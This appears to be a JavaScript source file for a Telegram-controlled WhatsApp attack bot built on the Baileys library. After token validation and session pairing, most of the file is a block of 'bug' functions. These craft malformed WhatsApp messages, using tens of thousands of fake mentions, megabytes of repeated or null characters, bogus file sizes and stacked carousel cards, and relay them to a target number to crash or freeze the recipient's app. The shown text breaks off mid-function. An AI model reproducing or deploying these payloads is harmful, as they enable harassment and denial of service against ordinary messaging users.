/* 
DEVELOPER: IbraDecode
*/
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const {
  default: makeWASocket, useMultiFileAuthState,downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto,
  WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header,
} = require("@whiskeysockets/baileys");

const fs = require("fs");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const axios = require("axios");
const BOT_TOKEN = config.BOT_TOKEN;
const chalk = require("chalk");
const PREMIUM_FILE = "./database/premium.json";

function loadPremiumUsers() {
  try {
    if (!fs.existsSync(PREMIUM_FILE)) {
      fs.writeFileSync(PREMIUM_FILE, JSON.stringify([]));
      return [];
    }
    return JSON.parse(fs.readFileSync(PREMIUM_FILE));
  } catch (error) {
    console.error("Error loading premium users:", error);
    return [];
  }
}

function savePremiumUsers(users) {
  try {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(users, null, 2));
  } catch (error) {
    console.error("Error saving premium users:", error);
  }
}


async function getBuffer(url) {
  try {
    const res = await axios.get(url, { responseType: "arraybuffer" });
    return res.data;
  } catch (error) {
    console.error(error);
    throw new Error("Gagal mengambil data.");
  }
}

const sessions = new Map();

const GITHUB_TOKEN_LIST_URL = 'https://raw.githubusercontent.com/syazwanadli2011/dbsc/refs/heads/main/token.json';

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; 
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Check Database..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid!"));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`ACCESS ACCEPT ✅`));
  console.log(chalk.blue(`Enjoy using this script`));
};

validateToken();
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);
    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  const SESSIONS_FILE = "./sessions/active_sessions.json";

  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions`);
        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });
        sessions.set(botNumber, sock);
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
╭─────────────────
│    MEMULAI    
│────────────────
│ Bot: ${botNumber}
│ Status: Inisialisasi...
╰─────────────────`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = `./sessions`;
  if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
╭─────────────────
│    RECONNECTING    
│────────────────
│ Bot: ${botNumber}
│ Status: Mencoba menghubungkan...
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
╭─────────────────
│    KONEKSI GAGAL    
│────────────────
│ Bot: ${botNumber}
│ Status: Tidak dapat terhubung
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
╭─────────────────
│    TERHUBUNG    
│────────────────
│ Bot: ${botNumber}
│ Status: Berhasil terhubung!
╰─────────────────`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
            const costum = "IBRA1234"
            const code = await sock.requestPairingCode(botNumber, costum);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
╭─────────────────
│    KODE PAIRING    
│────────────────
│ Bot: ${botNumber}
│ Kode: ${formattedCode}
╰─────────────────`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
╭─────────────────
│    ERROR    
│────────────────
│ Bot: ${botNumber}
│ Pesan: ${error.message}
╰─────────────────`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// [ BUG FUNCTION ]
// FUNCTION BUG!!!!!!!
async function CrashInvisble(jid) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( 🍁 ) Strom🦋",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "IbraDecode",
                address: "IbraDecode",
              },
            },
            body: {
              text: "( 🍁 ) Strom🫦",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: jid,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(jid, message, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid,
    });
  } catch (err) {
    console.log(err);
  }
}

async function protoxaudio2(jid, mention) {
    console.log(chalk.green("Protoxaudio Attack"));

    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
                    fileLength: 99999999999,
                    seconds: 24,
                    ptt: false,
                    mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
                    fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
                    directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1748513902,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋" + "ោ៝".repeat(10000),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TheRilyzyX7",
                            newsletterJid: "120363309802495518@newsletter",
                            serverMessageId: 1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                            name: "© -!s IbraDecode",
                            paramsJson: "\u0000".repeat(999999)
                        },
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/octet-stream",
                            fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                            fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                            fileLength: 99999999999,
                            mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                            fileName: "© -!s IbraDecode🐉",
                            mediaKeyTimestamp: 1748420423,
                            directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(jid, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "IbraDecode - INVISIBLE" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

//
async function PayXDocInvis(jid) {
    try {
        const bugMessage = {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "XXX",
                        amount1000: 999999999,
                        expiryTimestamp: Date.now() + 86400000,
                        requestFrom: "5521992999999@s.whatsapp.net",
                        noteMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/octet-stream",
                                fileSha256: "TGm7yntjlt1nZjJ8wLE/xkuXxYFELupibDkZZD83k8Q=",
                                fileEncSha256: "QUlCoNMgSucbRYWuHe2vzIrSoUaH+py7zePvtaSshqk=",
                                fileLength: "99999999999",
                                mediaKey: "TS0xXvvf6a1p/3WzoCuV/qQ3c2JNbiX2FuunvFWdDcc=",
                                fileName: "© -!s IbraDecode🐉",
                                mediaKeyTimestamp: "1748420423",
                                directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0",
                                contextInfo: {
                                    isForwarded: true,
                                    forwardingScore: 9999,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: "TheRilyzyX7",
                                        newsletterJid: "120363309802495518@newsletter",
                                        serverMessageId: 1
                                    },
                                    mentionedJid: Array.from({ length: 40000 }, () =>
                                        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                    ),
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "5521992999999@s.whatsapp.net"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "© -!s IbraDecode",
                                        paramsJson: "\u0000".repeat(999999)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage("status@broadcast", bugMessage.viewOnceMessage.message, {
            messageId: generateMessageID(),
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: jid },
                        content: undefined
                    }]
                }]
            }]
        });

    } catch (err) {
        console.log("Error:", err);
    }
}
async function paymenX(jid) {
    try {
        const bugMessage = {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "XXX",
                        amount1000: 999999999,
                        noteMessage: {
                            extendedTextMessage: {
                                text: "IbraDecode",
                                contextInfo: {
                                    isForwarded: true,
                                    forwardingScore: 9741,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: "IbraDecode",
                                        newsletterJid: "120363309802495518@newsletter",
                                        serverMessageId: 1
                                    },
                                    mentionedJid: Array.from({ length: 40000 }, () =>
                                        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                    ),
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "5521992999999@s.whatsapp.net"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "SpectraNoiseX",
                                        paramsJson: "\u0000".repeat(999999)
                                    }
                                }
                            }
                        },
                        expiryTimestamp: Date.now() + 86400000,
                        requestFrom: "5521992999999@s.whatsapp.net"
                    }
                }
            }
        }

        await sock.relayMessage('status@broadcast', bugMessage.viewOnceMessage.message, {
            messageId: generateMessageID(),
            statusJidList: [jid],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: jid },
                        content: undefined
                    }]
                }]
            }]
        })

    } catch (err) {
        console.log("Error:", err)
    }
}


async function CrashZ(jid) {
  const cardsX = {
    header: {
      title: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋",
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: jid,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "",
                      format: ""
                    },
                    nativeFlowResponseMessage: {
                      name: "",
                      paramsJson: "",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(jid, message, { messageId: null });
}

// FC RELOG

async function CrashX(jid) {
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: ""
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: jid,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ X.json }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(jid, message, { messageId: null });
}
async function BaccaratUi(sock, jid) {
  await sock.relayMessage(
    jid,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: jid } },
    { messageId: null }
  );
}

async function bulldozer1GB(sock, jid) {

  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: jid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function RkBlankNotif(sock, jid, Ptcp = false) {
    let virtex =
        "sukiii " +
        "ꦽ".repeat(92000) +
        "_*~@8~*_\n".repeat(92000);

    await sock.relayMessage(
        jid,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: virtex,
                        },
                        nativeFlowMessage: {
                            name: "call_permission_request",
                            messageParamsJson: "\u0000",
                        },
                        contextInfo: {
                            mentionedJid: ["0@s.whatsapp.net"],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "Bokep ",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                },
                            },
                        },
                    },
                },
            },
        },
        Ptcp
            ? {
                  participant: {
                      jid: jid,
                  },
              }
            : {}
    );

    console.log(chalk.green.bold("Strom Done Kill"));
}
async function NaviFlex(sock, jid, mention) {
    const thumbnail = 'https://files.catbox.moe/mpcjvi.jpg'

    const { imageMessage } = await generateWAMessageContent({
        image: { url: thumbnail }
    }, {
        upload: sock.waUploadToServer
    });

    const repeatedText = 'ꦽ'.repeat(50000); 
    const bodyText = `𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋͢͡${repeatedText}`;

    const cards = [
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
